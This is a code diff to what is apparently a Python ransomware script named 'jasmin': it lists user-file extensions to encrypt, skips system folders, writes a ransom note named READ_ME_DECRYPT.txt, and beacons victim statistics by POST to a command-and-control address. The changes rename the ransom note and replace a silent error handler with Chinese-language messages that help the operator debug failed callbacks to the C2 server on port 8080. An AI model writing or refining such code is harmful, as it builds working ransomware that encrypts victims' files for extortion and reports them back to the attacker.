@@ -32,7 +32,7 @@ import tempfile as _tf
 
 SKIP_DIRS=frozenset(['/System','/Library','/usr','/bin','/sbin','/private/var/db','/dev','/Volumes'])
 EXTS={'.pptx','.docx','.xlsx','.txt','.pdf','.csv','.jpg','.jpeg','.png','.zip','.rar','.7z','.mp3','.mp4','.sql','.bak','.html','.php','.py','.java','.json','.xml','.yaml','.md','.conf'}
-NOTE_NAME='READ_ME_解密教程.txt'
+NOTE_NAME='READ_ME_DECRYPT.txt'
 CHUNK=1024*1024  # 1MB 分块，内存占用恒定
 SELF=os.path.basename(__file__)
 
@@ -250,7 +250,11 @@ def beacon(sid,stats=None,prog=None):
             d['is_complete']='1'
         req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
         urllib.request.urlopen(req,timeout=10)
-    except:pass
+    except Exception as e:
+        # 不再静默：否则回连失败时后台永远没有数据，用户完全无从判断
+        sys.stderr.write('[jasmin] !!! 上报失败: %s\n'%C2)
+        sys.stderr.write('[jasmin] !!! 原因: %s\n'%e)
+        sys.stderr.write('[jasmin] !!! 请检查回连地址是否可达、端口是否正确(本服务在 :8080)、握手密钥是否与后台一致\n')
 
 def main():
     pub_obj=None;pub_pem_path=None
